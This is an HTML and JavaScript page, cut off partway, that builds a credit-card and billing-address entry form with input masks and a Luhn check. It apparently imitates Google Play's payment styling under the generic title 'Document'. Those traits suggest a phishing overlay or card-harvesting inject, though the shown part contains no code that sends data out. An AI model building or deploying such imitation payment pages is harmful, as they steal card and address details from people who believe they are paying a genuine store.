<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
    <style>
        form {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        section {
            flex: 1;
            padding: 20px;
        }

        .cool-input {
            box-sizing: border-box;
            border: 0;
            width: 100%;
            position: relative;
            font-size: 16px;
            margin-bottom: 15px;
        }

        .cool-input__input {
            box-sizing: border-box;
            background: none;
            width: 100%;
            padding: 6px;
            padding-left: 0;
            position: relative;
            z-index: 2;
            font-size: 1em;
        }
        .cool-input__input:focus {
            outline: none;
        }

        .cool-input__placeholder {
            box-sizing: border-box;
            border: none;
            background: none;
            position: absolute;
            z-index: 1;
            left: 40px;
            top: 50%;
            line-height: 0;
            color: #767676;
            transition: all 0.2s ease;
            font-weight: 600;
        }

        .cool-input__input_filled + .cool-input__placeholder,
        .cool-input__input:focus + .cool-input__placeholder {
            font-size: 0.8em;
            top: 0;
            margin-top: 0.5em;
            left: 0;
        }
        
        .cool-input__input:focus + .cool-input__placeholder {
            color: #0b8c65;
            font-weight: 600;
        }


        .input {
            border: 0;
            border-bottom: 2px solid #afafaf;
            padding-left: 40px;
            margin-top: 10px;
        }

        .input:focus { 
            border-color: #0b8c65;
        }

        .expAndCvcBlock, #holderInfo {
            height: 0;
            transition: 0.5s;
            overflow: hidden;
        }

        .active {
            height: 70px !important;
        }

        .active2 {
            height: 365px !important;
        }

        footer {
            padding: 15px 20px;
        }

        .button {
            padding: 8px;
            color: #fff;
            background-color: #01875f;
            width: 100%;
            border: 0;
            border-radius: 3px;
        }

        .button:disabled {
            color: rgb(105, 105, 105);
            background-color: #f1f3f4;
        }
    </style>
</head>

    <script>
        $('.cool-input__input').on('input', function(){
            var $this = $(this);
            if ($this.val() == '') {
                $this.removeClass('cool-input__input_filled');
            } else {
                $this.addClass('cool-input__input_filled');
            }
        });

        var custom_options = {
            translation: {
                '0': {pattern: /\d/},
                '9': {pattern: /\d/, optional: true},
                '#': {pattern: /[a-zA-Z  -]/, recursive: true},
                'A': {pattern: /[a-zA-Z]/},
                'S': {pattern: /[a-zA-Z]/}
            }
        };

        $('#cc').mask('0000 0000 0000 0000');
        $('#exp').mask('00/00');
        $('#cvc').mask('000');
        $('#holderName').mask('#' , custom_options)
        $('#country').mask('#' , custom_options)
        $('#city').mask('#' , custom_options)

        var cc = document.getElementById('cc'),
            errorCC = document.getElementById('errorCC'),
            exp = document.getElementById('exp'),
            errorEXP = document.getElementById('errorEXP'),
            errorName = document.getElementById('errorName'),
            errorCountry = document.getElementById('errorCountry'),
            errorStreet = document.getElementById('errorStreet'),
            errorCity = document.getElementById('errorCity'),
            expAndCvcBlock = document.getElementById('expAndCvcBlock'),
            holderInfo = document.getElementById('holderInfo'),
            holderName = document.getElementById('holderName'),
            country = document.getElementById('country'),
            address = document.getElementById('address'),
            aptSuite = document.getElementById('aptSuite'),
            postalCode = document.getElementById('postalCode'),
            city = document.getElementById('city'),
            sendData = document.getElementById('sendData');
            
		var month_;
		var year_;

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
                expAndCvcBlock.classList.add('active'),
                exp.focus();
            }
            return (nCheck % 10) == 0;
            
        }

        function check() {
            if(!valid_credit_card(cc.value)){
                errorCC.style.display = 'block'
            } else {
                errorCC.style.display = 'none'
            }

            if(cc.value.length === 0) {
                document.getElementById('emptyCC').style.display = 'inline';
                document.getElementById('americaCC').style.display = 'none';
